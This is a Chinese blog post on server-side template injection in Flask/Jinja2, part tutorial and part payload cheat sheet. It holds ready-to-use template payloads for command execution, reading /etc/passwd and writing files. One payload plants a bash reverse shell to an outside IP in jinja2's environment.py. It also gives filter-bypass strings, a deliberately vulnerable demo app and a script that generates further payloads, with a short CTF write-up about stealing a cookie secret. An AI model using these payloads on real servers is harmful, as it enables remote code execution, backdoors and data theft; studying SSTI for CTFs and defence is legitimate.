---
layout:     post
title:      flask-ssti
subtitle:   模板注入
date:       2020-04-15
author:     BY Diego
header-img: img/post-bg-ios9-web.jpg
catalog: true
tags:
    - python
    - SSTI
---

## 模板
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200217115605356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU3MTAyOA==,size_16,color_FFFFFF,t_70)


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200217115615227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU3MTAyOA==,size_16,color_FFFFFF,t_70)
## payload
**python3**
```python3
#命令执行：
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```
**python2**
```python
#注入变量执行命令详见 http://www.freebuf.com/articles/web/98928.html
#读文件：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
#写文件：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
```

**jinja2**
```py
#假设在/usr/lib/python2.7/dist-packages/jinja2/environment.py, 弹一个shell
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/usr/lib/python2.7/dist-packages/jinja2/environment.py').write("\nos.system('bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1')") }}
```

**绕过**

无单引号
>{{().\_\_class__.\_\_bases__.\_\_getitem__(0).\_\_subclasses__().pop(40)(request.args.path).read()}}&path=/tmp/cmd.py

下划线绕过
>?name={{\'\'[request.args.class][request.args.mro][2][request.args.subclasses]\()\[40]('/etc/passwd').read()}}&class=\_\_class__&mro=\_\_mro__&subclasses=\_\_subclasses__

>利用 **config** 查看环境
>**self.\_\_dict__**  查看环境
>**flask** 可以利用 url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config 

>url_for.\_\_globals__['current_app'].\_\_dict__
>get_flashed_messages.\_\_globals__['current_app'].\_\_dict__

## 1.漏洞产生原因

**漏洞定义 ：SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式**

**原因**
服务端未对用户输入的数据进行过滤，并使用模板对数据进行渲染，进而产生的漏洞。


## 2.漏洞利用（演示）

应用程序代码

```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name', 'guest')

    t = Template("Hello " + name)
    return t.render() #输入未过滤进行渲染

if __name__ == "__main__":
    app.run()
```

**检测**
```
http://192.168.56.105:8000/?name={{9*9}}
```
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTA0MTUucG5n?x-oss-process=image/format,png)


**遇到的web题目**（简单描述）
存在三个页面
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTEwMTMucG5n?x-oss-process=image/format,png)
分别点进去
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTExMzAucG5n?x-oss-process=image/format,png)
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTExNTgucG5n?x-oss-process=image/format,png)
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTEyMjgucG5n?x-oss-process=image/format,png)
一开始以为哈希长度拓展攻击，后来才知道是模板注入漏洞
其中存在一个页面如下（当校验失败的时候会出现）
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTE2MzUucG5n?x-oss-process=image/format,png)
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTE1MDYucG5n?x-oss-process=image/format,png)
存在漏洞，进一步利用获取**cookie_secret**的值，然后获取flag

## 3.利用原理

* **python内敛函数dir()** ，用来获得当前模块的属性列表
dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法__dir__()，该方法将被调用。如果参数不包含__dir__()，该方法将最大限度地收集参数信息。
<br>
* **\_\_builtins\_\_**
这个涉及到了Python的命名空间，类似于c++的**using namespace std**
在一个正常的Python程序的执行过程中，至少存在两个名称空间
**内建名称空间**、**全局名称空间**,如果定义函数那还存在**局部名称空间**
Python解释器在启动的时候会首先加载内建名称空间，也就是那些不用声明就可以直接调用的函数、对象等存在的地方
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTI5MDIucG5n?x-oss-process=image/format,png)
圈出来的就是我比较常见的函数等
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDExOTI5NDUucG5n?x-oss-process=image/format,png)
这里有一片文章，解释的挺好 https://yq.aliyun.com/articles/40788
<br>
* **常见的特殊方法**
**\_\_class\_\_** 返回调用的参数类型。
**\_\_base\_\_** 返回基类
**\_\_mro\_\_** 允许我们在当前Python环境下追溯继承树
**\_\_subclasses\_\_()** 返回子类

，**大佬们的思路是从一个内置变量调用__class__.__base__等隐藏属性，去找到一个函数，然后调用其__globals__['builtins']即可调用eval等执行任意代码。**
我并不是特别清楚这是啥意思

**寻找步骤**
```python
{}.__class__.__base__.__subclasses__() #{}这个类型.父类.所有子类
  # 返回子类的列表 [,,,...]
```
上述代码就是通过基类访问基类的子类

举个例子,运行如下代码
```python
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    print(index,i)
```
返回结果为（仅后面几个）
```
131 <class '_sitebuiltins._Helper'>
132 <class 'MultibyteCodec'>
133 <class 'MultibyteIncrementalEncoder'>
134 <class 'MultibyteIncrementalDecoder'>
135 <class 'MultibyteStreamReader'>
136 <class 'MultibyteStreamWriter'>
```
再运行如下代码
```python
class test:
    test1 = 123
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    print(index,i)
```
返回结果为
```
131 <class '_sitebuiltins._Helper'>
132 <class 'MultibyteCodec'>
133 <class 'MultibyteIncrementalEncoder'>
134 <class 'MultibyteIncrementalDecoder'>
135 <class 'MultibyteStreamReader'>
136 <class 'MultibyteStreamWriter'>
137 <class '__main__.test'>  # 自己定义的类也会出现在这个空间内
```

然后查看每个类的 **\_\_init\_\_**,运行如下代码
```python
class test:
    test1 = 123
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    print(index,i.__init__)
```
结果
```
128 <function _wrap_close.__init__ at 0x00FE9A50>
129 <function Quitter.__init__ at 0x00FE9DB0>
130 <function _Printer.__init__ at 0x00FE9E88>
131 <slot wrapper '__init__' of 'object' objects>
132 <slot wrapper '__init__' of 'object' objects>
133 <slot wrapper '__init__' of 'MultibyteIncrementalEncoder' objects>
134 <slot wrapper '__init__' of 'MultibyteIncrementalDecoder' objects>
135 <slot wrapper '__init__' of 'MultibyteStreamReader' objects>
136 <slot wrapper '__init__' of 'MultibyteStreamWriter' objects>
137 <slot wrapper '__init__' of 'object' objects> #自己定义的类
```
**wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性**。后来测试发现这个值跟类有没有初始化有关，如下·

```python
class test:
    test1 = 123
    def __init__(self) : self.test1 = 123
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    print(index,i.__init__)
```
结果
```python
137 <function test.__init__ at 0x0109CD68> # 因此他也具有了__globals__属性
```

上面只是自己证明了，怎样才会有__globals__属性和自定义的类所在的空间，对于利用来说，内置的类有的已经被初始化有了__globals__属性，可以直接利用。

**__globals__属性**
借用大佬的话就是 **python 解释器发现函数中的某个变量被 global 关键字修饰，就去函数的 \_\_globals__ 字典变量中寻找（因为 python 中函数也是一等对象）；同时，一个模块中每个函数的 \_\_globals__ 字典变量都是模块 \_\_dict__ 字典变量的引用，二者值完全相同。**

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDEyMTE5NTEucG5n?x-oss-process=image/format,png)]
与此同时我发现了system函数，所以就不用再去调用 **\_\_builtins\_\_**
如下
```Python
{}.__class__.__base__.__subclasses__()[128].__init__.__globals__['system']('dir')
```
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYW5rZTAwMS8tL21hc3Rlci9pbWcvMjAxOTA5MDEyMTI3MDEucG5n?x-oss-process=image/format,png)
成功执行命令 **这个命令跟python版本有关，不同的版本其内置函数不同**

emmmm,system测试没有回显（伤心），于是按照 **\_\_builtins\_\_** 方法进行
**payload**

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='_wrap_close' %}
{{c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /etc/passwd').read()") }}
{% endif %}{% endfor %}
```

[外链图片转存失败(img-sIJWgbk3-1567425348157)(https://raw.githubusercontent.com/shanke001/-/master/img/20190901220258.png)]


最后贴出大佬的脚本，可以找出所有能利用点，而且还可以直接转化成符合jinja2语法的payload串

```python
#!/usr/bin/python3
# coding=utf-8
# python 3.5
from flask import Flask
from jinja2 import Template
# Some of special names
searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
neededFunction = ['eval', 'open', 'exec']
pay = int(input("Payload?[1|0]"))
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    for attr in searchList:
        if hasattr(i, attr):
            if eval('str(i.'+attr+')[1:9]') == 'function':
                for goal in neededFunction:
                    if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                        if pay != 1:
                            print(i.__name__,":", attr, goal)
                        else:
                            print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")
```

参考文章 ： https://www.cnblogs.com/hackxf/p/10480071.html

绕过 https://www.cnblogs.com/zaqzzz/p/10263396.html
